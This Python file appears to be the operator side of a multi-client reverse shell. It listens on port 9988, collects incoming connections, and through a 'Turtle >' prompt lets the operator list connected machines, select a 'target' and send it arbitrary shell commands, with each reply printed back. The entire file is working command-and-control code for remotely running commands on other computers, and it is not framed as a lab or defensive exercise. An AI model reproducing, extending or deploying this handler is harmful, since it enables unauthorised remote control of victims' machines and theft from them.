import socket
import threading
import time
from queue import Queue
import logging
import sys
import os

PORT = 9988
NUMBER_OF_THREADS = 2
JOB_NUMBER = [1, 2]

queue = Queue()
all_connections = []
all_addresses = []

def create_socket():
	try:
		global host
		global port
		global s
		host = ''
		port = PORT
		s = socket.socket()
	except socket.error as msg:
		print ("socket creation error: " + str(msg))
		os._exit(1)

def bind_socket():
	try:
		global host
		global port
		global s
		s.bind((host,port))
		s.listen(5)
	except socket.error as msg:
		print ("socket binding error: " + str(msg))
		os._exit(1)

def accept_connections():
	for c in all_connections:
		c.close()
	del all_connections[:]
	del all_addresses[:]
	while True:
		try:
			conn, address = s.accept()
			s.setblocking(1)
			all_connections.append(conn)
			all_addresses.append(address)
		except:
			conn.close()

def list_connections():
	l = len(all_connections)
	i = 0
	while i<l:
		try:
			all_connections[i].send(str.encode(' '))
		except:
			del all_connections[i]
			del all_addresses[i]
			l = l-1
			continue
		print (str(i) + ' ' + str(all_addresses[i][0]) + ' at port ' + str(all_addresses[i][1]))
		i = i+1

def print_help():
	print ("type 'list' to get the list of all connections")
	print ("type 'select' to select a connection from the given list")

def get_target(cmd):
	try:
		target = cmd.split(' ')[-1]
		ntarget = int(target)
		conn = all_connections[ntarget]
		print ('You are now connected to ' + str(all_addresses[ntarget][0]) + ' at port ' + str(all_addresses[ntarget][1]))
		print ()
		send_target_commands(conn, ntarget)
	except IndexError:
		print ('please enter a valid index')

def send_target_commands(conn, target):
	conn.send(str.encode('start'))
	client_response = str(conn.recv(1024), "utf-8")
	print (client_response, end="")
	while True:
		cmd = input()
		print (cmd)
		if cmd == 'quit':
			break
		try:
			if len(cmd) > 0:
				conn.send(str.encode(cmd))
				client_response = str(conn.recv(1024), "utf-8")
				print (client_response, end="")
		except:
			print ('Some error occured')
			break
	conn.send(str.encode('quit'))
	print ('Closing the connection ' + str(all_addresses[target][0]) + ' at port ' + str(all_addresses[target][1]))
	conn.close()
	del all_connections[target]
	del all_addresses[target]

def start_turtle():
	print ()
	print_help()
	print ()
	while True:
		print ("Turtle > ",end="")
		cmd = input()
		if cmd == 'quit':
			l = len(all_connections)
			for i in range(l):
				conn = all_connections[i]
				conn.send(str.encode('start'))
				data = conn.recv(1024)
				conn.send(str.encode('quit'))
				conn.close()
			del all_connections[:]
			del all_addresses[:]
			os._exit(1)
		elif cmd == 'list':
			list_connections()
		elif 'select' in cmd:
			conn = get_target(cmd)
			if conn is not None:
				send_target_commands(conn, int(cmd.split(' ')[-1]))
		else:
			print ('Command not recognised')
			print_help()
		print ()

def create_workers():
    for i in range(NUMBER_OF_THREADS):
        t = threading.Thread(target=work)
        t.daemon = True
        t.start()
    return


def work():
    while True:
        x = queue.get()
        if x == 1:
            create_socket()
            bind_socket()
            accept_connections()
        if x == 2:
            start_turtle()
        queue.task_done()
    return

def create_jobs():
    for x in JOB_NUMBER:
        queue.put(x)
    queue.join()
    return

def main():
    create_workers()
    create_jobs()

main()
